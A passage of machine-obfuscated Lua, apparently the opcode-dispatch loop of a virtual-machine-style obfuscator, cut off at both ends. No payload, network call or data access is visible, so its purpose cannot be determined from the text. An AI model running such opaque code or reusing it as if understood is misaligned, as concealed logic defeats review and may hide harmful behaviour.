ba=ba+1 end end;elseif(z<38 or z==38)then local ba,bb,bc,bd=0 while true do if(ba<9 or ba==9)then if(ba<4 or ba==4)then if(ba<1 or ba==1)then if not(ba==1)then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[469]]=h[y[345]];else n=n+1;end end end else if(ba<6 or ba==6)then if(6~=ba)then y=f[n];else w[y[469]]=h[y[345]];end else if(ba==7 or ba<7)then n=(n+1);else if not(ba~=8)then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if(ba<=14)then if(ba==11 or ba<11)then if not(10~=ba)then n=(n+1);else y=f[n];end else if(ba==12 or ba<12)then w[y[469]]=w[y[345]][w[y[491]]];else if ba<14 then n=n+1;else y=f[n];end end end else if(ba==16 or ba<16)then if(ba>15)then bc={w[bd](w[bd+1])};else bd=y[469]end else if(ba<17 or ba==17)then bb=0;else if 18<ba then break else for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=(ba+1)end elseif 40>z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[469]]=j[y[345]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][y[491]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[469]end else if ba<=17 then bb=0;else if 18<ba then break else for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end else w[y[469]]=b(d[y[345]],nil,j);end;elseif z<=43 then if z<=41 then local ba;w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif z<43 then w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;end;elseif 44>=z then if w[y[469]]then n=n+1;else n=y[345];end;elseif z<46 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()else do return w[y[469]]end end;elseif 69>=z then if z<=57 then if 51>=z then if 48>=z then if z~=48 then w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;else local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif 49>=z then if(w[y[469]]~=y[491])then n=y[345];else n=n+1;end;elseif z<51 then w[y[469]]=true;else w[y[469]]=w[y[345]]-y[491];end;elseif 54>=z then if 52>=z then if not w[y[469]]then n=n+1;else n=y[345];end;elseif z~=54 then local ba;local bb;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={r({},1,y[345])};n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];bb=y[469];ba=w[bb];for bc=bb+1,y[345]do t(ba,w[bc])end;else local ba;w[y[469]]=w[y[345]]%w[y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+y[491];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=55 then h[y[345]]=w[y[469]];elseif z>56 then if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 63>=z then if 60>=z then if 58>=z then if(not(w[y[469]]==w[y[491]]))then n=n+1;else n=y[345];end;elseif(z==59)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[469]]=w[y[345]][y[491]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[469]]=h[y[345]];else n=n+1;end else if ba<=6 then y=f[n];else if ba<8 then w[y[469]]=w[y[345]][w[y[491]]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=11 then n=n+1;else if 12<ba then w[y[469]]=w[y[345]][y[491]];else y=f[n];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[469]else if 18~=ba then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[469]]=h[y[345]];end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[469]end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 61>=z then local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 62==z then local ba;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=66 then if(64>=z)then if(w[y[469]]<w[y[491]])then n=n+1;else n=y[345];end;elseif not(z~=65)then local ba=y[469]w[ba]=w[ba](r(w,(ba+1),y[345]))else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[469]]=j[y[345]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba<=6 then y=f[n];else if 8~=ba then w[y[469]]=y[345];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[469]]=y[345];end else if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[469]]=y[345];end end end else if ba<=15 then if ba>14 then y=f[n];else n=n+1;end else if ba<=16 then bb=y[469]else if ba==17 then w[bb]=w[bb](r(w,bb+1,y[345]))else break end end end end end ba=ba+1 end end;elseif 67>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[469]]=h[y[345]];else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[469]]=h[y[345]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[469]]=w[y[345]][w[y[491]]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[469]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[491]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 68<z then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=81 then if 75>=z then if z<=72 then if z<=70 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 71<z then local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba;local bb;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={r({},1,y[345])};n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];bb=y[469];ba=w[bb];for bc=bb+1,y[345]do t(ba,w[bc])end;end;elseif z<=73 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 75>z then w[y[469]]={r({},1,y[345])};else w[y[469]]={};end;elseif 78>=z then if 76>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;elseif 77==z then w[y[469]][y[345]]=y[491];else w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];end;elseif z<=79 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 81~=z then w[y[469]]=y[345]*w[y[491]];else local ba;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif z<=87 then if 84>=z then if 82>=z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()elseif 83==z then w[y[469]]=w[y[345]]%y[491];else for ba=y[469],y[345],1 do w[ba]=nil;end;end;elseif 85>=z then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end elseif 87~=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];if(w[y[469]]~=y[491])then n=n+1;else n=y[345];end;else local ba;w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif z<=90 then if 88>=z then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then w[y[469]]={};else n=n+1;end end else if ba<=4 then if ba==3 then y=f[n];else w[y[469]]=h[y[345]];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[469]]=w[y[345]][y[491]];else if 9>ba then n=n+1;else y=f[n];end end else if ba<=11 then if ba==10 then w[y[469]][y[345]]=w[y[491]];else n=n+1;end else if ba==12 then y=f[n];else w[y[469]]=j[y[345]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if 16>ba then y=f[n];else w[y[469]]=w[y[345]][y[491]];end end else if ba<=18 then if ba~=18 then n=n+1;else y=f[n];end else if ba~=20 then w[y[469]]=j[y[345]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if 22==ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end else if ba<=25 then if ba==24 then y=f[n];else bb=y[469]end else if ba<27 then w[bb]=w[bb]()else break end end end end end ba=ba+1 end elseif 89==z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];for ba=y[469],y[345],1 do w[ba]=nil;end;n=n+1;y=f[n];n=y[345];end;elseif z<=91 then w[y[469]]=w[y[345]]*y[491];elseif z>92 then local ba;w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()else local ba;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 140>=z then if z<=116 then if z<=104 then if 98>=z then if 95>=z then if z>94 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];ba=y[469]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=96 then local ba;local bb;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];bb=y[469];ba=w[bb];for bc=bb+1,y[345]do t(ba,w[bc])end;elseif 98~=z then a(c,e);else local ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif z<=101 then if z<=99 then local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end else if ba~=3 then y=f[n];else w[y[469]][y[345]]=w[y[491]];end end else if ba<=5 then if ba>4 then y=f[n];else n=n+1;end else if 7~=ba then w[y[469]]=w[y[345]][y[491]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba==8 then y=f[n];else w[y[469]]=h[y[345]];end else if 10<ba then y=f[n];else n=n+1;end end else if ba<=13 then if ba>12 then n=n+1;else w[y[469]]=w[y[345]][y[491]];end else if ba<=14 then y=f[n];else if ba>15 then break else if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;end end end end end ba=ba+1 end elseif 101~=z then local ba;w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]];n=n+1;y=f[n];ba=y[469]w[ba](r(w,ba+1,y[345]))else local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end end;elseif 102>=z then local ba=y[469]w[ba]=w[ba](w[ba+1])elseif z<104 then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if w[y[469]]then n=n+1;else n=y[345];end;end;elseif z<=110 then if 107>=z then if(105>=z)then w[y[469]]=y[345];elseif(z<107)then if(w[y[469]]<=w[y[491]])then n=y[345];else n=n+1;end;else w[y[469]]=w[y[345]][y[491]];end;elseif 108>=z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()elseif z>109 then local ba;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))end;elseif 113>=z then if z<=111 then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba]()elseif 113>z then w[y[469]][y[345]]=w[y[491]];else w[y[469]][y[345]]=y[491];end;elseif z<=114 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=j[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif z>115 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]]+y[491];n=n+1;y=f[n];h[y[345]]=w[y[469]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]();else local ba=y[469];do return w[ba],w[ba+1]end end;elseif 128>=z then if 122>=z then if z<=119 then if z<=117 then local ba;w[y[469]]=w[y[345]];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];w[y[469]]=y[345];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 118<z then local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))else local ba;w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](w[ba+1])end;elseif z<=120 then local ba;w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]={};n=n+1;y=f[n];w[y[469]][y[345]]=y[491];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];ba=y[469]w[ba]=w[ba](r(w,ba+1,y[345]))elseif 122~=z then local ba;local bb;local bc;w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][w[y[491]]];n=n+1;y=f[n];bc=y[469]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[491]do ba=ba+1;w[bd]=bb[ba];end else w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]][y[345]]=w[y[491]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];w[y[469]]=h[y[345]];n=n+1;y=f[n];w[y[469]]=w[y[345]][y[491]];n=n+1;y=f[n];if(w[y[469]]~=w[y[491]])then n=n+1;else n=y[345];end;end;elseif z<=125 then if z<=123 then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if 4~=ba then n=n+1;else y=f[n];end end end else if ba<=7 then if ba<=5 then w[y[469]]=h[y[345]];else if ba~=7 then n=n+1;else y=f[n];end end else if ba<=8 then w[y[469]]=w[y[345]][y[491]];else if ba==9 then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then 